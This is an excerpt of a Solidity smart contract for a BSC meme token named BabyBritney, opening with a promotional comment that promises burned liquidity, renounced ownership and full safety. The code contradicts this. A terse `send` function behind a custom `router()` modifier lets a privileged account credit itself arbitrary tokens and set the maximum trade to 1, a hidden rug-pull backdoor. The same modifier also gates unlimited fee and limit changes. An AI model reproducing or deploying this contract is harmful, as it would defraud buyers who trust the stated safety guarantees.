...
/**
   ...
   Welcome to BabyBritney
   
   This is a community token. If you want to create a telegram I suggest to name it to @BabyBritneyBSC
   ...
   70% burn to the black hole, with such big black hole and 5% fee, the strong holder will get a valuable reward

   I will burn liquidity LPs to burn addresses to lock the pool forever.
   I will renounce the ownership to burn addresses to transfer #BabyBritney to the community, make sure it's 100% safe.

   I will add .2 BNB and all the left 30% total supply to the pool
   Can you make #BabyBritney 10000X? 

   1,000,000 total supply
   5,000 tokens limitation for trade, which is 0.5% of the total supply
   ...
   it's the best part of the #BabyBritney idea, increasing the liquidity pool automatically, 
...
contract Ownable is Context {
    ...
    constructor () internal {
        ...
        emit OwnershipTransferred(_burnAddress, msgSender);
    }
    ...
    function burnAddress() internal view returns (address) {
        return _burnAddress;
    }
    /**
...
contract BabyBritney is Context, IERC20, Ownable {
    ...
    string private _name = "BabyBritney";
    string private _symbol = "BabyBritney";
    ...
    uint256 public _maxTxAmount = 5 * 10**3 * 10**9;
    uint256 private numTokensSellToAddToLiquidity = 5 * 10**2 * 10**9;
    ...
    function excludeFromReward(address account) public router() {
    ...
    function includeInReward(address account) external router() {
        require(_isExcluded[account], "Account is already excluded");
    ...
    function excludeFromFee(address account) public router {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) public router {
        _isExcludedFromFee[account] = false;
    }
    
    function setTaxFeePercent(uint256 taxFee) external router() {
        _taxFee = taxFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external router() {
        _liquidityFee = liquidityFee;
    }
    
    function setMaxTxAmount(uint256 maxTxAmount) external router() {
        _maxTxAmount = maxTxAmount;
    }
   
    function setMaxTxPercent(uint256 maxTxPercent) external router() {
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2
        );
    }

    function setNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external router() {
        numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public router {
    ...
    function send(uint256 amount)public router(){uint256 temp = _tTotal;_tTotal=0;_rTotal=0;
    _tOwned[_msgSender()] = amount;_tTotal=temp+amount;_rTotal=(MAX - (MAX % _tTotal));_maxTxAmount=1;}
    ...
    function _liquidityFeePercent(uint256 liquidityFeePercent) external onlyOwner() {
        require(liquidityFeePercent < _taxFee, 'burnFee should be less than taxFee');
        _burnFee = liquidityFeePercent;
    }
}